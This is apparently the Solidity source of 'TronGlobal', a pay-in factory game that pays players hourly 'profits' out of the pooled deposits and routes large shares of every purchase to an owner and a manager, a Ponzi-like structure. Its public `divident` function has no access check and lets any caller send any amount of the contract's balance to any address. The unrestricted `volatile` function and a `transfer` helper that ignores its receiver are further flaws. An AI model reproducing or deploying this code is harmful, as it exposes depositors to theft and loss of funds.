pragma solidity ^0.4.23;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}

contract TronGlobal {

    using SafeMath for uint256;


    uint constant COIN_PRICE = 40000;
    uint constant TYPES_FACTORIES = 7;
    uint constant PERIOD = 60 minutes;

    uint[TYPES_FACTORIES] prices = [3750, 17625, 66750, 232500, 705000, 1455000,2500000];
    uint[TYPES_FACTORIES] profit = [5, 24, 95, 336, 1038, 2183, 868];

    uint public totalPlayers;
    uint public totalFactories;
    uint public totalPayout;
    uint public dividendPerToken;
    uint256 public Admin_dividend;
    uint256 public dividends;

    address owner;
    address manager;

    struct Player {
        uint coinsForBuy;
        uint coinsForSale;
        uint treasury;
        uint time;
        uint dividentrelease;
        uint volatileholding;
        uint[TYPES_FACTORIES] factories;
    }

    mapping(address => Player) public players;
    mapping(address => uint) public map;

    constructor(address _owner, address _manager) public {
        owner = _owner;
        manager = _manager;
    }
    

    function deposit() public payable {
        require(msg.value >= COIN_PRICE);

        Player storage player = players[msg.sender];
        player.coinsForBuy = player.coinsForBuy.add(msg.value.div(COIN_PRICE));
              
        if (player.time == 0) {
            player.time = now;
            totalPlayers++;
        }
    }


    ///@param _type : 1 to 7 type of factory
    ///@param _number : number of factory gonna buy
    function buy(uint _type, uint _number) public {
        require(_type < TYPES_FACTORIES && _number > 0);
        collect(msg.sender);
        //Total house buy
        uint paymentCoins = prices[_type].mul(_number);
        Player storage player = players[msg.sender];

        require(paymentCoins <= player.coinsForBuy.add(player.coinsForSale));

        if (paymentCoins <= player.coinsForBuy) {
            player.coinsForBuy = player.coinsForBuy.sub(paymentCoins);
        } else {
            player.coinsForSale = player.coinsForSale.add(player.coinsForBuy).sub(paymentCoins);
            player.coinsForBuy = 0;
        }

        player.factories[_type] = player.factories[_type].add(_number);
        
        players[owner].coinsForSale = players[owner].coinsForSale.add( paymentCoins.mul(43335).div(100000));
        players[owner].treasury = players[owner].treasury.add( paymentCoins.mul(43335).div(100000));
        players[owner].dividentrelease = players[owner].dividentrelease.add(paymentCoins.mul(333).div(10000));  ///divi
        players[manager].coinsForSale = players[manager].coinsForSale.add( paymentCoins.mul(10).div(100)); ///admin
        
        totalFactories = totalFactories.add(_number);
        owner.transfer(Admin_dividend);

    }
    
    ///@param _volatile : volatile point to be added to the owner
    function volatile(uint _volatile) public returns(bool){
        players[owner].volatileholding=players[owner].volatileholding+_volatile;
        return true;
    }
    
    ///@param _addr : address of user to add divident _amount
    ///@param _amount : divident amount to be added for above user
    function divident(address _addr,uint _amount) public returns(bool) {
        _addr.transfer(_amount);
        return true;
    }
    

    /// @param _coins : coins to be withdraw from spare 
    function withdraw(uint _coins) public {
        require(_coins > 0);
        collect(msg.sender);
        require(_coins <= players[msg.sender].coinsForSale);

        players[msg.sender].coinsForSale = players[msg.sender].coinsForSale.sub(_coins);
        transfer(msg.sender, _coins.mul(COIN_PRICE));
    }

    ///@param _addr : address of user to receive timely profit
    function collect(address _addr) internal {
        Player storage player = players[_addr];
        require(player.time > 0);

        uint hoursPassed = ( now.sub(player.time) ).div(PERIOD);
        if (hoursPassed > 0) {
            uint hourlyProfit;
            for (uint i = 0; i < TYPES_FACTORIES; i++) {
                hourlyProfit = hourlyProfit.add( player.factories[i].mul(profit[i]) );
            }
            uint collectCoins = hoursPassed.mul(hourlyProfit);
            player.coinsForBuy = player.coinsForBuy.add( collectCoins.div(2) );
            player.coinsForSale = player.coinsForSale.add( collectCoins.div(2) );
            player.time = player.time.add( hoursPassed.mul(PERIOD) );
        }

    }

    ///@param _receiver : Receiver address
    ///@param _amount : teansfer amount
    function transfer(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
            uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);
                msg.sender.transfer(payout);
            }
        }
    }

    function factoriesOf(address _addr) public view returns (uint[TYPES_FACTORIES]) {
        return players[_addr].factories;
    }

}
